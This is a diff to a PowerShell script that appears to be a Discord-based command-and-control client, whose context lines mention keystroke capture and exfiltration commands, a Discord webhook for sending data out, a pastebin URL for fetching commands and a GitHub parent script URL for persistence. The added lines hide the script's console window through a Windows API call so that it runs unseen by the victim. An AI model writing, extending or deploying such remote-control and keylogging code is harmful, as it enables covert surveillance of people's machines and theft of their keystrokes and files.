@@ -33,6 +33,15 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 # $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 # $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
 
+# HIDE THE WINDOW - Change to 1 to hide the console window
+$HideWindow = 1
+
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+}
+
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
